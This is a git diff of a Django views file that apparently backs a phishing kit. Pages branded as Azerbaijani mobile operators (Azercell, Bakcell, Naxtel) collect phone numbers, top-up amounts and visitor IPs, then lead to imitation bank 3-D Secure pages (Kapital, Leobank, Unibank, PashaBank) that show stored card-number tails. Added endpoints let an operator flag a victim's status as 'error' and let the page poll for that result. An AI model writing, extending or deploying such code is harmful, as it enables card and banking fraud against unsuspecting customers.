@@ -22,6 +22,19 @@ def nar(request):
     return render(request, "pages/nar.html")
 
 def naxtel(request):
+    if request.method == "POST":
+        operator = request.POST.get('operator')
+        amount = request.POST.get("amount")
+        number = request.POST.get("number")
+        if amount is None or len(amount) == 0:
+            return render(request, "pages/azercell.html",)
+        client_ip = get_client_ip(request)
+        contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
+        contact.save()
+        request.session['operator'] = operator
+        request.session['phone'] = number
+        request.session['amount'] = amount
+        return redirect('info')
     return render(request, "pages/naxtel.html")
 
 
@@ -39,6 +52,8 @@ def azercell(request):
         operator = request.POST.get('operator')
         amount = request.POST.get("amount")
         number = request.POST.get("number")
+        if amount is None or len(amount) == 0:
+            return render(request, "pages/azercell.html",)
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
         contact.save()
@@ -55,6 +70,8 @@ def bakcell(request):
         operator = request.POST.get('operator')
         amount = request.POST.get("amount")
         number = request.POST.get("number")
+        if amount is None or len(amount) == 0:
+            return render(request, "pages/azercell.html",)
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
         contact.save()
@@ -130,6 +147,7 @@ def loading(request):
 def kapital(request):
     last_contact = ContactModel.objects.latest('created_at')
     contex = {
+        'last_contact_id': last_contact.id,
         "amount":last_contact.amount
     }
     return render(request, "pages/kapital.html",contex)
@@ -263,6 +281,19 @@ def contact_approve_pashabank(request, pk):
     return JsonResponse({'success': True})
 
 
+@ensure_csrf_cookie
+def contact_approve_error(request, pk):
+    contact = get_object_or_404(ContactModel, pk=pk)
+    
+    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
+    contact.bankname = "error"
+    contact.save()
+
+    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
+    # Örneğin: return redirect('azercell')
+
+    return JsonResponse({'success': True})
+
 def approval_page(request, pk):
     contact = get_object_or_404(ContactModel, pk=pk)
     context = {'contact': contact}
@@ -349,6 +380,7 @@ def leobank3d(request):
     last_contact = ContactModel.objects.latest('created_at')
     
     context = {
+    'last_contact_id': last_contact.id,
     'amount':last_contact.amount,
     'cc': last_contact.cc[-4:],
     }
@@ -390,14 +422,19 @@ def unibank3d(request):
 def pashabank(request):
     last_contact = ContactModel.objects.latest('created_at')
     number = str(last_contact.phone)
-
     context = {
+        'last_contact_id': last_contact.id,
         'number': number[-4:],
         'amount': last_contact.amount,
         'cc': last_contact.cc[-4:],
     }
-    print(context)
     return render( request,'pages/pasha.html',context )
+
+
+def error(request):
+    
+    return render( request,'pages/error.html' )
+
 
 
 @ensure_csrf_cookie
@@ -435,3 +472,17 @@ def pashabank3d(request):
     
     
     return render( request,'pages/loading.html' )
+
+
+
+
+
+
+
+def check_status(request):
+    last_contact = get_object_or_404(ContactModel.objects.order_by('-created_at')[:1])
+    data = {
+        'error_message': last_contact.error_message
+    }
+    return JsonResponse(data)
+
